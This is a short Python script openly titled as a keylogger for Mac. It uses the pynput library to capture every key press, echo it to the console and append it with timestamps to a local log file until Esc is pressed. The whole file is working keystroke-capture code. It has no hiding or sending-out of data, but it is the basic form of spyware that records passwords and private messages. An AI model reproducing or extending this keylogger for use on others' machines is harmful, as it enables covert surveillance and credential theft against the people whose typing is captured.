# Keylogger for Mac

from pynput import keyboard
import datetime

def main():
    try:
        f = open("keylogger.txt", 'a') # defined globaly
        now = datetime.datetime.now()
        f.write("\n\nRan at: ")
        f.write(str(now))
        f.write("\n")
        
            
        def get_key_name(key):
            if isinstance(key, keyboard.KeyCode):
                return key.char 
            else:
                return str(key)
        
        def on_press(key):
            key_name = get_key_name(key)
            print('Key {} pressed.'.format(key_name))
            f.write(key_name) # writes keys to "keylogger.txt"
            f.write(" ")
        
        # Get keylogger to log special keys
            
        
        def on_release(key):
            key_name = get_key_name(key)
            print('Key {} released.'.format(key_name))
        
            if key_name == 'Key.esc':
                print('Exiting...')
                now1 = datetime.datetime.now()
                f.write("\nClosed at: ")
                f.write(str(now1))      
                f.close() 
                return False
            
        with keyboard.Listener(on_press = on_press,on_release = on_release) as listener:
            listener.join()
            
    except: # Have exception to allow the file to be closed so info can be stored
        now1 = datetime.datetime.now()
        f.write("\nClosed at: ")
        f.write(str(now1))     
        f.close()
        
main()